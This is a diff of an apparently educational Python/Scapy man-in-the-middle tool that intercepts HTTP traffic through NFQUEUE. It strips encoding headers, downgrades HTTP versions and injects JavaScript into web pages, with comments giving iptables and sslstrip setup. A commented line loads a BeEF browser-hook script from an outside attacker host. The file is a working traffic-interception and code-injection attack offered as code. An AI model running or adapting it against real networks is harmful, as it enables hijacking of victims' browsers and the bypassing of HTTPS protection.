@@ -7,7 +7,7 @@
 # iptables -I INPUT -j NFQUEUE --queue-num 0
 # iptables --flush
 
-# Targeting a remote computer, using sslstrip 
+# Targeting a remote computer, using sslstrip
 # iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 # iptables -I OUTPUT -j NFQUEUE --queue-num 0
 # iptables -I INPUT -j NFQUEUE --queue-num 0
@@ -29,36 +29,29 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = sc.IP(packet.get_payload())
     if scapy_packet.haslayer(sc.Raw):
-        try:
-            load = scapy_packet[sc.Raw].load.decode()
-            # if scapy_packet[sc.TCP].dport == 80:
-            if scapy_packet[sc.TCP].dport == 10000: # sslstrip
-                # print(f'[+] Request > {load}')
-                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
-                load = load.replace('HTTP/1.1', 'HTTP/1.0')
-            # elif scapy_packet[sc.TCP].sport == 80:
-            elif scapy_packet[sc.TCP].sport == 10000: # sslstrip
-                # print(f'[+] Response > {load}')
-                injection_code = '<script>alert("test");</script>'
-                # injection_code = '<script src="http://10.0.2.13:3000/hook.js"></script>' # BeEF
-                load = load.replace(
-                    # '</body>', injection_code + '</body>')
-                    '</head>', injection_code + '</head>')
-                content_length_search = re.search(
-                    '(?:Content-Length:\s)(\d*)', load)
-                if content_length_search and 'text/html' in load:
-                    content_length = content_length_search.group(1)
-                    new_content_length = int(
-                        content_length) + len(injection_code)
-                    load = load.replace(
-                        content_length, str(new_content_length))
+        load = scapy_packet[sc.Raw].load.decode(errors='ignore')
+        if scapy_packet[sc.TCP].dport == 80:
+        # if scapy_packet[sc.TCP].dport == 10000: # sslstrip
+            load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
+            load = load.replace('HTTP/1.1', 'HTTP/1.0')
 
-            if load != scapy_packet[sc.Raw].load:
-                # print(f'[+] Modified load > {load}')
-                new_packet = set_load(scapy_packet, load)
-                packet.set_payload(bytes(new_packet))
-        except UnicodeDecodeError:
-            pass
+        elif scapy_packet[sc.TCP].sport == 80:
+        # elif scapy_packet[sc.TCP].sport == 10000: # sslstrip
+            injection_code = '<script>alert("code injector");</script>'
+            # injection_code = '<script src="http://10.0.2.13:3000/hook.js"></script>' # BeEF
+            load = load.replace('</head>', injection_code + '</head>')
+            content_length_search = re.search(
+                '(?:Content-Length:\s)(\d*)', load)
+            if content_length_search and 'text/html' in load:
+                content_length = content_length_search.group(1)
+                new_content_length = str(
+                    int(content_length) + len(injection_code))
+                load = load.replace(content_length, new_content_length)
+                load = load.encode()
+
+        if load != scapy_packet[sc.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(bytes(new_packet))
 
     packet.accept()
 
